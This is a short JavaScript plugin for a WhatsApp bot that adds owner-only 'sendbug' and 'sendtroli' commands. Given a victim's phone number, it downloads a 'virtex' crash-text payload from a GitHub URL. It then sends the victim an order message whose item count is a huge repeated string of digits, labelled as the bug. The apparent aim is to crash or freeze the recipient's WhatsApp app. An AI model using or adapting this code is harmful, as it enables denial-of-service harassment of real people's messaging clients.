// By Caliph
let handler = async (m, { conn, text, args, usedPrefix, command }) => {
if (!text) throw `Format Salah!!\nContoh : ${usedPrefix + command} +62 812-1365-7325`
virtex = await require('node-fetch')('https://raw.githubusercontent.com/Caliph71/txt/main/virtex.txt').then(v => v.text())
yahaha = await conn.prepareMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {
   orderMessage: {
    itemCount: "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999".repeat(9999), // Bug
    status: "INQUIRY",
   surface: "CATALOG",
    message: virtex,
    orderTitle: 'MAMPUS', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }, {})

conn.relayWAMessage(yahaha)
}
handler.help = ['sendbug <nomor>', 'sendtroli <nomor>']
handler.tags = ['host']
handler.command = /^(sendtroli|sendbug)$/i
handler.owner = true 

module.exports = handler